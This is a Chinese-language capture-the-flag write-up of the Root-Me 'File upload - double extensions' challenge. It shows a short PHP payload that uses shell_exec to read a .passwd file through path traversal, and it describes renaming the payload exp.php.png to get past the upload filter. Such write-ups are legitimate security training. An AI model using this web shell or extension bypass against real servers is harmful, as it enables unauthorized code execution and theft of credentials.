## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[File upload - double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-double-extensions)] [[解题报告](http://exp-blog.com/2019/01/13/pid-2985/)]

------

题目给出了两个提示：

- 双重后缀绕过（double extensions）
- 目标文件 .passwd 在 web 服务的根路径

上传一个图片测试一下，页面会给出图片的 URL 地址，点开后可以打开原图，猜测这或许是一个可利用点。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B14%5D%20%5B20P%5D%20File%20upload%20-%20double%20extensions/imgs/01.png)

又从给出的 URL 地址知道，上传的文件距离 web 服务根目录的位置，因此可以构造一个路径穿越的 payloads 文件，文件名为 `exp.php`：

```php
<?php
	// exp.php.png
	// 假如这个文件上传成功，则可以利用 web 打开这个文件进行解析时进行路径穿越
	$content = shell_exec('cat ../../../.passwd');
	echo "<pre>$content</pre>";
?>
```

但因为上传会检测文件后缀，无法直接上传。把文件更名为 `exp.php.png` 尝试绕过检测机制，上传成功。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B14%5D%20%5B20P%5D%20File%20upload%20-%20double%20extensions/imgs/02.png)

上传成功后，打开这个伪造的图片文件，发现它被作为 php 文件解析了（应该是 web 设置的问题），成功获得密码，完成挑战。


![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B14%5D%20%5B20P%5D%20File%20upload%20-%20double%20extensions/imgs/03.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
